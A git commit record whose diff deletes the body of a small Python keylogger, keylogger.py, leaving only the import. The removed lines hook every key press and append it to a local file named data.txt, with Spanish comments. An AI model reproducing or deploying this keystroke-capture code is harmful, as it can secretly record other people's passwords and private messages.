a1f0aff7801def9722dc7f43630a270f312bca48
JoseGeek78 <josemariarodriguez78@gmail.com>
2025-04-18 15:37:35 +0200

    .

--- keylogger.py
+++ keylogger.py
@@ -2,17 +2,3 @@
 
 import keyboard
 
-def pressed_keys(event):
-    try:
-        with open('data.txt', 'a') as file:
-            if event.name == 'space':
-                file.write(' ')  # Agregar un espacio en lugar de nada
-            elif event.name == 'enter':
-                file.write('\n')  # Agregar una nueva línea cuando se presiona Enter
-            else:
-                file.write(event.name)
-    except Exception as e:
-        print(f"Error al escribir en el archivo: {e}")
-
-keyboard.on_press(pressed_keys)
-keyboard.wait()
